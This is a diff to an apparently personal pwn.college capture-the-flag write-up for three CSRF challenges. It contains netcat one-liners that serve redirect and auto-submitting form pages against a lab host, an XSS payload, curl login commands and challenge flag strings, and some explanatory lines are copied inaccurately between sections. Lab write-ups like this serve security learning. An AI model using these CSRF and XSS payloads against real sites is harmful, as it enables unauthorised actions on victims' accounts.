@@ -322,14 +322,13 @@ pwn.college{U0-aNStAuHMrzlr55C57ZbTebYA.dJDO1YDL5ETN1QzW}
 Setting up a redirect using nc:
 
 ```bash
-printf 'HTTP/1.1 302 Found\r\nLocation: http://challenge.localhost/publish\r\n\r\n' | nc -l -p 8080
-
+printf 'HTTP/1.1 302 Found\r\nLocation: http://challenge.localhost/publish\r\n\r\n' | nc -l -p 1337
 ```
 
 When the victim visits our site he is redirected to the /publish and post the flag. We can then log in as guest to view it:
 
 ```bash
-curl -c cookies.txt -X POST "http://challenge.localhost:80/login" -d "username=guast&password=password}"
+curl -c cookies.txt -X POST "http://challenge.localhost:80/login" -d "username=guest&password=password"
 curl -b cookies.txt "http://challenge.localhost:80"
 ```
 
@@ -338,18 +337,30 @@ pwn.college{4ODFGRt6eAK9vbZHFQ6JkqcOGFS.ddTOzMDL5ETN1QzW}
 
 ## CSRF 2
 
-Setting up a redirect using nc:
+Setting up a webpage that sends a POST request using nc:
 
 ```bash
-printf 'HTTP/1.1 302 Found\r\nLocation: http://challenge.localhost/publish\r\n\r\n' | nc -l -p 8080
-
+printf 'HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html><body><form id="f" action="http://challenge.localhost/publish" method="POST"><input type="hidden" name="foo" value="bar"></form><script>document.getElementById("f").submit();</script></body></html>' | nc -l -p 1337
 ```
 
 When the victim visits our site he is redirected to the /publish and post the flag. We can then log in as guest to view it:
 
 ```bash
-curl -c cookies.txt -X POST "http://challenge.localhost:80/login" -d "username=guast&password=password}"
+curl -c cookies.txt -X POST "http://challenge.localhost:80/login" -d "username=guest&password=password"
 curl -b cookies.txt "http://challenge.localhost:80"
 ```
 
-pwn.college{4ODFGRt6eAK9vbZHFQ6JkqcOGFS.ddTOzMDL5ETN1QzW}
+pwn.college{sXgZKCDxj2Hiz-8JxTE5dWKwGWJ.dhTOzMDL5ETN1QzW}
+
+
+## CSRF 3
+
+Setting up a webpage that sends a POST request using nc:
+
+```bash
+printf "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html><body><form id=\"f\" action=\"http://challenge.localhost/ephemeral\"><input type=\"hidden\" name=\"msg\" value=\"<script>alert('PWNED');</script>\"></form><script>document.getElementById('f').submit();</script></body></html>" | nc -l -p 1337
+```
+
+When the victim visits our site he is redirected to the /publish and post the flag. We can then log in as guest to view it:
+
+pwn.college{c3jwePPn29_JUALBWRDvbLuZaK_.dNDO1YDL5ETN1QzW}
